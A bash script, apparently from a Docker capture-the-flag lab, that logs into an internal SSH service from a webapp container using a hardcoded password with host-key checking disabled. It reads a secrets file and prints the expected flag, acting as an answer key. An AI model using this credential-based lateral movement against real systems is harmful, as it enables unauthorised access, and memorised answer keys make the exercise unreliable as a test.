#!/bin/bash
# Script to capture Flag 2 from the SSH service

echo "=========================================="
echo "Capturing Flag 2 from SSH Service"
echo "=========================================="
echo ""

echo "📋 Connecting to SSH service at 172.20.0.20:2222"
echo "   Username: sshuser"
echo "   Password: SecurePass2024!"
echo ""

# Try to connect and get the flag
docker exec 2_network_webapp bash -c "
if command -v ssh >/dev/null 2>&1; then
    echo '[*] Attempting SSH connection...'
    sshpass -p 'SecurePass2024!' ssh -o StrictHostKeyChecking=no -p 2222 sshuser@172.20.0.20 'cat ~/secrets/flag2.txt' 2>/dev/null || \
    echo 'SSH client not available. Please connect manually:'
    echo '  docker exec -it 2_network_webapp bash'
    echo '  ssh sshuser@172.20.0.20 -p 2222'
    echo '  Password: SecurePass2024!'
    echo '  cat ~/secrets/flag2.txt'
else
    echo 'SSH client not installed in container.'
    echo ''
    echo 'Manual steps:'
    echo '1. Enter the webapp container:'
    echo '   docker exec -it 2_network_webapp bash'
    echo ''
    echo '2. Install SSH client (if needed):'
    echo '   apt-get update && apt-get install -y openssh-client'
    echo ''
    echo '3. Connect to SSH service:'
    echo '   ssh sshuser@172.20.0.20 -p 2222'
    echo '   Password: SecurePass2024!'
    echo ''
    echo '4. Read the flag:'
    echo '   cat ~/secrets/flag2.txt'
fi
"

echo ""
echo "=========================================="
echo "Expected Flag 2: FLAG{h1dd3n_s3rv1c3s_n33d_pr0t3ct10n}"
echo "=========================================="

